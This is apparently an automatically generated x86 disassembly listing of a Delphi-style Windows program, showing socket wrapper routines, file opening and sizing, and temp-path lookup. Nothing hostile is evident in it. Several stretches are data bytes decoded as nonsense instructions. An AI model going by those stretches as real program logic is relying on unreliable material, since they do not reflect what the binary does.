mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_473608
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_473330
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_473630
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4736c4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_408288
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_408288
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_408288
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_408288
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_40442c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4736cb
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040d0
retn
sub_4736d7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_47375f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404100
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473766
lea eax [ ebp - 0x1c ]
call sub_4040ac
retn
sub_473770
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_40436c
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_473360
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4737e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_473360
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473838
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_472c5c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_473894
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_4042a4
or edx 0xffffffff
mov eax esi
call sub_472c5c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4738e4
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4046f8
mov eax [ ebx ]
call sub_40436c
push eax
mov eax [ ebx ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_40456c
mov edx eax
mov eax ebx
call sub_4042a4
pop ebx
retn
sub_47392c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_473948
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4739d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_404100
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4739da
lea eax [ ebp - 0x1c ]
call sub_4040ac
retn
sub_4739e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_418b6c
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_418854
add ebx 0x4
dec esi
jne r-xdata
sub_473a20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_473ab5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473abc
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4189b0
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_473ac4
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402cc4
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402cc4
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402cc4
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_473a20
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_473a20
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_473a20
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_4739e4
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_4739e4
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_4739e4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473bdc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_473bf8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402cc4
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_473360
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_473c64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_473c84
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0xc ] eax
sub_473ce4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_473db1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_4038a4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4083c4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473db8
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
sub_473d6b
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473db8
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
sub_473dd7
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_473ee1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405298
xor eax eax
push ebp
push j_sub_403778#4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_4042a4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_4052d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473ee8
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405298
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4042a4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_473eab
mov eax [ ebp - 0x4 ]
call sub_4032b0
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473ee8
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405298
retn
sub_473f0c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_473fa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_40456c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_472c5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473fad
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040d0
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_473fb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_473fd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_474086
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_474069
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474070
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_474098
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_47415b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0x8 ]
call sub_4083c4
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0xc ]
call sub_4083c4
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0x10 ]
call sub_4083c4
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0x14 ]
call sub_4083c4
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474162
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_4040d0
retn
sub_474180
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47420e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_472c5c
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_404100
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474215
lea eax [ ebp - 0x18 ]
call sub_4040ac
retn
sub_474220
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4742ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_472c5c
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_404100
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4742b5
lea eax [ ebp - 0x18 ]
call sub_4040ac
retn
sub_4742c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_4742e0
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_47433a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474341
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_474348
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_4743a2
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4743a9
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_4743b0
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_4743e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_474485
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_472e20
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47448c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408fe4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404100
sub_474494
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4744cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4744d4
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_474504
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474529
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474530
retn
sub_474617
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ esi + eax * 2 ] ah
inc edi
add [ ebx ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
js r-xdata
add al [ eax ]
add [ eax ] al
pushad
inc esi
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] ah
inc esi
inc edi
add [ ebx ] cl
insd
popad
inc ebp
js r-xdata
rcl [ ebx + 0x56 ] 0x8b
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c774
pop esi
pop ebx
retn
outsb
outsb
je r-xdata
adc [ edx ] eax
cmp [ cs : eax + eax ] eax
jo r-xdata
pop es
jb r-xdata
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
rol [ esi + 0x47 ] 0x1
add [ ecx ] dl
add ebp [ esi ]
xor [ ecx ] dh
add al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
or [ ecx + 0x64 ] cl
inc edi
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
inc esi
popad
insb
jae r-xdata
sar [ ebp + 0x2 ] 0x1
push esp
jb r-xdata
inc edi
dec ecx
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
inc esi
inc edi
add [ ebx ] al
push cs
push esp
dec ecx
push edx
jne r-xdata
sar [ ebx ] 0xd0
jge r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
nop
lodsb [ esi ]
inc esi
inc edi
add [ ecx ] dl
add ch [ esi ]
cmp [ eax + eax ] eax
retn
jb r-xdata
pop es
add [ eax + edx + 0x49080040 ] dl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov eax eax
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax edx
inc edi
add [ 0x534f7372 ] cl
inc esp
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x46 ] ah
add [ eax ] al
add [ eax ] al
sub_4747f0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47484f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4046f8
mov eax [ ebx ]
call sub_40456c
push eax
mov eax [ ebx ]
call sub_40436c
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_4046f8
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_4746f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474856
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_47485c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4748fd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40436c
mov esi eax
cmp ebx 0xffffffff
jne r-xdata
mov eax edi
call sub_40436c
sub eax esi
inc eax
cmp ebx eax
jge r-xdata
mov eax edi
call sub_40436c
mov ebx eax
mov eax edi
call sub_40436c
sub eax esi
inc eax
mov eax ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474904
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4045cc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4080e8
test al al
je r-xdata
mov ebx eax
cmp ebx 0x1
jl r-xdata
dec ebx
test ebx ebx
jne r-xdata
